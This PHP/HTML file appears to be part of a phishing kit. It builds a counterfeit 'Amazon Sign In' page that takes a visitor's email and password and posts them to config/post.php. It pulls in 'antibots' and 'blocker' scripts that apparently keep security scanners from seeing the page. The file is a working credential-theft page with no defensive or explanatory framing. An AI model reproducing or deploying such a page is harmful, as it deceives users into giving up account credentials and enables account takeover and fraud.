<?php
if (!isset($_SESSION)) {
  session_start();
}
 
include "./D/antibots.php";  
include "./D/blocker.php";

$rand = @$_GET['dispatch'];

?>
<!DOCTYPE html>
<html>
<head>
	<title>Amazon Sign In</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png" />
</head>
<body>
<div  class="containtindex">
<div class="tajouriform">
<form action="config/post.php?dispatch=<?php echo $rand;?>" method="POST">
<div class="tajouriemail">
	<input type="text"  style="width: 296px;height: 27px;border: 1px solid rgb(170, 170, 170);border-radius: 5px;text-indent: 10px;" name="email" required />
</div>
<div class="tajouripassword">
	<input type="password" style="width: 296px;height: 27px;border: 1px solid rgb(170, 170, 170);border-radius: 5px;text-indent: 10px;"  name="password" required />
</div>
<div class="tajourisubmitin">
	<input class="btn" type="submit" value="Sign in" />
</div>


	
</form>	
</div>
</div>
</body>
</html>